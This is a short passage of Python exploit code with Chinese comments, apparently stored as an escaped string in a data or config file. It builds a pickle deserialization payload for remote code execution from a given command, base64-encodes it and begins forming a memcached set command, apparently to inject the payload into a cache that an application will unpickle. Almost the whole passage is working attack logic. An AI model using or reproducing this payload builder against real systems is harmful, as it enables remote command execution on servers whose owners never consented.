    \    # 构建 pickle payload\n        pickle_data = build_pickle_rce_payload(command)\n\
    \        \n        # 将 pickle 数据编码为 base64 以便在 memcached 命令中使用\n        pickle_b64\
    \ = base64.b64encode(pickle_data).decode('ascii')\n        \n        # 构建 memcached\
    \ set 命令\n        # set <key> <flags> <exptime> <bytes>\\r\\n<data>\\r\\n\n  \
